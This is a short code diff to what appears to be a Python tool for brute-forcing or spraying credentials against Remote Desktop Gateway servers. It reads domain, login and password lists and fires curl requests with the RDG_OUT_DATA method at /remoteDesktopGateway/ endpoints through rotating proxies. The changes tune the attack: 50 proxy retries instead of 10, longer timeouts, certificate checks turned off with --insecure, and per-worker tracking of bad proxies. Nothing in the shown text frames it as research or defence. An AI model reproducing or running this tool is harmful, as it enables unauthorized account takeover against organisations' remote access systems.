@@ -23,11 +23,9 @@ DOMAINS_FILE = "data/domains.txt"
 LOGINS_FILE = "data/logins.txt"
 PASSWORDS_FILE = "data/passwords.txt"
 TEST_FILE = "data/test.txt"
-MAX_PROXY_RETRIES = 10
+MAX_PROXY_RETRIES = 50
 
-bad_proxy_counter = defaultdict(int)
 proxy_lock = asyncio.Lock()
-
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
 
@@ -54,7 +52,7 @@ async def execute_curl(site_domain, user_domain, login, password, proxy):
     full_user = f"{user_domain}\\{login}"
     url = f"https://{site_domain}/remoteDesktopGateway/"
     curl_cmd = [
-        "curl", "--max-time", "10",
+        "curl", "--max-time", "30", "--insecure",
         "-D", "-",
         "-X", "RDG_OUT_DATA",
         "-H", f"RDG-Connection-Id: {{{conn_id}}}",
@@ -91,6 +89,7 @@ async def worker(domain_line, logins, passwords):
     total_combinations = len(logins) * len(passwords)
     tried = set()
     active_proxies = set()
+    bad_proxy_counter = defaultdict(int)
 
     async def run_proxy_task(proxy):
         nonlocal tried
